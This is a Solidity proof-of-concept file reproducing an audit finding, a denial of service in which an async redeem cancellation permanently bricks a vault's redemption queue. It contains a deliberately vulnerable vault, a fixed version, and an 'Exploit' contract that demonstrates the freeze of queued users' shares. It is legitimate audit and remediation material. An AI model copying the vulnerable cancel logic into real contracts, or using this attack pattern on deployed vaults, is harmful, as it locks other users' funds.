// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Accountable finding 62970:
// "Critical DOS in queue processing if async cancellations are allowed".
//
// AccountableAsyncRedeemVault.cancelRedeemRequest() marks
// state.pendingCancelRedeemRequest = true and ONLY reduces the queued shares
// (via _reduce) when the strategy fulfils the cancel synchronously. If the
// strategy supports ASYNC cancellations it returns false, so the request stays
// in the FIFO queue with its shares INTACT while the cancel flag is set.
//
// When processUpToShares() later reaches that request, _processRequest() returns
// its normal (non-zero) share data — the loop does NOT skip it — so the loop
// calls _fulfillRedeemRequest(), which reverts on
//   `if (state.pendingCancelRedeemRequest) revert RedeemRequestWasCancelled();`
// The whole processUpToShares() transaction reverts. The cancelled-but-queued
// request sits at the head of the queue and can never be advanced, so EVERY
// call to processUpToShares() reverts — the entire redemption queue is bricked
// and all queued shares (including innocent users behind the head) are frozen.
//
// The two load-bearing functions (cancelRedeemRequest and the
// _fulfillRedeemRequest cancel guard) are inlined VERBATIM from the finding
// (imports / pragma / `override` stripped). The FIFO processor
// (requestRedeem / _processRequest / processUpToShares) is a faithful minimal
// reconstruction of the queue machinery described in the finding.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Opaque external boundary: the redemption strategy. `onCancelRedeemRequest`
///      returns whether the cancel can be fulfilled synchronously. An async
///      strategy returns false (this is the only legitimately-doubled boundary).
interface IRedeemStrategy {
    function onCancelRedeemRequest(address vault, address controller) external returns (bool);
}

/// @dev Async strategy: cancellations are NOT instant -> returns false.
contract AsyncStrategy is IRedeemStrategy {
    function onCancelRedeemRequest(address, address) external pure returns (bool) {
        return false;
    }
}

/// @dev Sync strategy: cancellations are instant -> returns true.
contract SyncStrategy is IRedeemStrategy {
    function onCancelRedeemRequest(address, address) external pure returns (bool) {
        return true;
    }
}

/// @dev Minimal ERC20 marker used to record the frozen-shares magnitude at SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault. cancelRedeemRequest() and the _fulfillRedeemRequest cancel
// guard are inlined VERBATIM from the finding; the FIFO processor is a faithful
// reconstruction.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVault {
    struct VaultState {
        uint256 pendingRedeemRequest;
        bool pendingCancelRedeemRequest;
    }

    struct Request {
        address controller;
        uint256 shares;
        bool fulfilled;
    }

    // Errors (names verbatim from the finding).
    error NoPendingRedeemRequest();
    error CancelRedeemRequestPending();
    error NoRedeemRequest();
    error InsufficientAmount();
    error RedeemRequestWasCancelled();

    event CancelRedeemRequest(address indexed controller, uint256 requestId, address indexed caller);

    IRedeemStrategy public strategy;

    mapping(address => VaultState) internal _vaultStates;

    mapping(uint256 => Request) public requests;
    uint256 public nextRequestId = 1; // head of the FIFO queue
    uint256 public lastRequestId = 1; // next id to assign (one past the tail)

    uint256 internal constant PRICE = 1e18;

    modifier onlyAuth() {
        _;
    }

    constructor(IRedeemStrategy _strategy) {
        strategy = _strategy;
    }

    // --- views for the driver / harness ---
    function pendingRedeemRequest(address controller) external view returns (uint256) {
        return _vaultStates[controller].pendingRedeemRequest;
    }

    function pendingCancelRedeemRequest(address controller) external view returns (bool) {
        return _vaultStates[controller].pendingCancelRedeemRequest;
    }

    function _checkController(address controller) internal pure {
        require(controller != address(0), "bad controller");
    }

    // --- queue entry: a user requests to redeem `shares` (appends to the FIFO) ---
    function requestRedeem(uint256 shares, address controller) external returns (uint256 requestId) {
        _checkController(controller);
        requestId = lastRequestId;
        requests[requestId] = Request({controller: controller, shares: shares, fulfilled: false});
        _vaultStates[controller].pendingRedeemRequest += shares;
        lastRequestId++;
    }

    // ═════════════════════════════════════════════════════════════════════════
    // VERBATIM vulnerable function (from the finding; `override`/imports stripped)
    // ═════════════════════════════════════════════════════════════════════════
    function cancelRedeemRequest(uint256 requestId, address controller) public onlyAuth {
        _checkController(controller);
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoPendingRedeemRequest();
        if (state.pendingCancelRedeemRequest) revert CancelRedeemRequestPending();

        state.pendingCancelRedeemRequest = true;

        bool canCancel = strategy.onCancelRedeemRequest(address(this), controller); // @> async strategy returns false: flag set true but the queued shares are left UN-REDUCED
        if (canCancel) {
            uint256 pendingShares = state.pendingRedeemRequest;

            _fulfillCancelRedeemRequest(uint128(requestId), controller);
            _reduce(controller, pendingShares);
        }
        emit CancelRedeemRequest(controller, requestId, msg.sender);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // VERBATIM cancel guard from _fulfillRedeemRequest (from the finding)
    // ═════════════════════════════════════════════════════════════════════════
    function _fulfillRedeemRequest(uint128 requestId, address controller, uint256 shares, uint256 price)
        internal
    {
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoRedeemRequest();
        if (state.pendingRedeemRequest < shares) revert InsufficientAmount();
        if (state.pendingCancelRedeemRequest) revert RedeemRequestWasCancelled();  // @audit reverts on a still-queued async-cancelled request -> bricks the loop

        // Fulfilment (reduced faithfully): settle the redemption and drop it from the queue.
        price; // price is unused in the reduced harness
        requests[requestId].fulfilled = true;
        _reduce(controller, shares);
    }

    function _fulfillCancelRedeemRequest(uint128 requestId, address /*controller*/) internal {
        requests[requestId].fulfilled = true; // a synchronously-fulfilled cancel leaves the queue
    }

    function _reduce(address controller, uint256 shares) internal {
        _vaultStates[controller].pendingRedeemRequest -= shares;
    }

    // A still-queued (un-reduced) request yields NON-ZERO shares, so the FIFO loop
    // does not skip it and proceeds to _fulfillRedeemRequest.
    function _processRequest(uint256 id) internal view returns (address controller, uint256 shares, uint256 price) {
        Request storage r = requests[id];
        if (r.fulfilled || r.shares == 0) {
            return (address(0), 0, 0);
        }
        return (r.controller, r.shares, PRICE);
    }

    // Minimal FIFO processor: walk nextRequestId -> lastRequestId.
    function processUpToShares(uint256 maxShares) external {
        uint256 processed = 0;
        uint256 id = nextRequestId;
        while (id < lastRequestId) {
            (address controller, uint256 shares,) = _processRequest(id);
            if (shares == 0) {
                // already settled/cancelled synchronously: skip it and advance the head.
                nextRequestId = id + 1;
                id++;
                continue;
            }
            if (processed + shares > maxShares) break;
            // Reverts on a cancelled-but-queued request -> the whole tx reverts (DoS).
            _fulfillRedeemRequest(uint128(id), controller, shares, PRICE);
            processed += shares;
            nextRequestId = id + 1;
            id++;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED vault: async cancellation support removed (the actual fix). A cancel is
// ALWAYS fulfilled synchronously, so the queued shares are always reduced and the
// request always leaves the queue — processUpToShares() can never hit a
// cancelled-but-queued request.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVaultFixed {
    struct VaultState {
        uint256 pendingRedeemRequest;
        bool pendingCancelRedeemRequest;
    }

    struct Request {
        address controller;
        uint256 shares;
        bool fulfilled;
    }

    error NoPendingRedeemRequest();
    error CancelRedeemRequestPending();
    error NoRedeemRequest();
    error InsufficientAmount();
    error RedeemRequestWasCancelled();

    event CancelRedeemRequest(address indexed controller, uint256 requestId, address indexed caller);

    IRedeemStrategy public strategy;

    mapping(address => VaultState) internal _vaultStates;

    mapping(uint256 => Request) public requests;
    uint256 public nextRequestId = 1;
    uint256 public lastRequestId = 1;

    uint256 internal constant PRICE = 1e18;

    modifier onlyAuth() {
        _;
    }

    constructor(IRedeemStrategy _strategy) {
        strategy = _strategy;
    }

    function pendingRedeemRequest(address controller) external view returns (uint256) {
        return _vaultStates[controller].pendingRedeemRequest;
    }

    function pendingCancelRedeemRequest(address controller) external view returns (bool) {
        return _vaultStates[controller].pendingCancelRedeemRequest;
    }

    function _checkController(address controller) internal pure {
        require(controller != address(0), "bad controller");
    }

    function requestRedeem(uint256 shares, address controller) external returns (uint256 requestId) {
        _checkController(controller);
        requestId = lastRequestId;
        requests[requestId] = Request({controller: controller, shares: shares, fulfilled: false});
        _vaultStates[controller].pendingRedeemRequest += shares;
        lastRequestId++;
    }

    function cancelRedeemRequest(uint256 requestId, address controller) public onlyAuth {
        _checkController(controller);
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoPendingRedeemRequest();
        if (state.pendingCancelRedeemRequest) revert CancelRedeemRequestPending();

        // FIX: async cancellations removed. The cancel is ALWAYS fulfilled now, so
        // the shares are ALWAYS reduced and the request ALWAYS leaves the queue.
        uint256 pendingShares = state.pendingRedeemRequest;
        _fulfillCancelRedeemRequest(uint128(requestId), controller);
        _reduce(controller, pendingShares);
        // No lingering `pendingCancelRedeemRequest = true` with shares still queued.
        emit CancelRedeemRequest(controller, requestId, msg.sender);
    }

    function _fulfillRedeemRequest(uint128 requestId, address controller, uint256 shares, uint256 price)
        internal
    {
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoRedeemRequest();
        if (state.pendingRedeemRequest < shares) revert InsufficientAmount();
        if (state.pendingCancelRedeemRequest) revert RedeemRequestWasCancelled();

        price;
        requests[requestId].fulfilled = true;
        _reduce(controller, shares);
    }

    function _fulfillCancelRedeemRequest(uint128 requestId, address /*controller*/) internal {
        requests[requestId].fulfilled = true;
    }

    function _reduce(address controller, uint256 shares) internal {
        _vaultStates[controller].pendingRedeemRequest -= shares;
    }

    function _processRequest(uint256 id) internal view returns (address controller, uint256 shares, uint256 price) {
        Request storage r = requests[id];
        if (r.fulfilled || r.shares == 0) {
            return (address(0), 0, 0);
        }
        return (r.controller, r.shares, PRICE);
    }

    function processUpToShares(uint256 maxShares) external {
        uint256 processed = 0;
        uint256 id = nextRequestId;
        while (id < lastRequestId) {
            (address controller, uint256 shares,) = _processRequest(id);
            if (shares == 0) {
                nextRequestId = id + 1;
                id++;
                continue;
            }
            if (processed + shares > maxShares) break;
            _fulfillRedeemRequest(uint128(id), controller, shares, PRICE);
            processed += shares;
            nextRequestId = id + 1;
            id++;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: user A queues a redemption (head of queue), user B queues one
// behind it, A cancels via an ASYNC strategy (flag set, shares un-reduced), and
// processUpToShares() then permanently reverts — freezing every queued share.
// The frozen magnitude is recorded on a marker token minted to SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    address internal constant USER_A = 0x000000000000000000000000000000000000aaaa;
    address internal constant USER_B = 0x000000000000000000000000000000000000BbBB;

    uint256 internal constant A_SHARES = 50 ether;
    uint256 internal constant B_SHARES = 100 ether;

    // Exposed results.
    address public vaultAddr;
    address public markerAddr;
    bool public dosConfirmed;
    uint256 public bPendingAfter;
    uint256 public frozenShares;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        // --- deploy the opaque boundary double, the vulnerable vault, and the marker (marker LAST) ---
        AsyncStrategy async = new AsyncStrategy();                             // nonce 1
        AccountableAsyncRedeemVault v = new AccountableAsyncRedeemVault(async); // nonce 2
        MiniToken marker = new MiniToken("Locked Shares", "LOCKED-SHARES");   // nonce 3

        vaultAddr = address(v);
        markerAddr = address(marker);

        // --- A queues a redemption (id=1, head), B queues one behind it (id=2) ---
        v.requestRedeem(A_SHARES, USER_A);
        v.requestRedeem(B_SHARES, USER_B);

        // --- A cancels: async strategy returns false -> flag set, shares NOT reduced ---
        v.cancelRedeemRequest(1, USER_A);

        // Sanity: the cancel is "pending" but A's shares are still queued (un-reduced).
        require(v.pendingCancelRedeemRequest(USER_A), "cancel flag not set");
        require(v.pendingRedeemRequest(USER_A) == A_SHARES, "A shares wrongly reduced");

        // --- processing the queue now reverts (DoS), proven cheatcode-free via try/catch ---
        bool reverted;
        try v.processUpToShares(type(uint256).max) {
            reverted = false;
        } catch {
            reverted = true;
        }
        dosConfirmed = reverted;
        require(reverted, "expected queue processing to revert (DoS)");

        // The head never advanced past the cancelled request: B can never be processed.
        require(v.nextRequestId() == 1, "queue head advanced despite DoS");
        bPendingAfter = v.pendingRedeemRequest(USER_B);
        require(bPendingAfter == B_SHARES, "B's redemption not frozen");

        // --- HARM: every queued share is now permanently frozen behind the brick ---
        frozenShares = v.pendingRedeemRequest(USER_A) + v.pendingRedeemRequest(USER_B);
        marker.mint(SINK, frozenShares);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
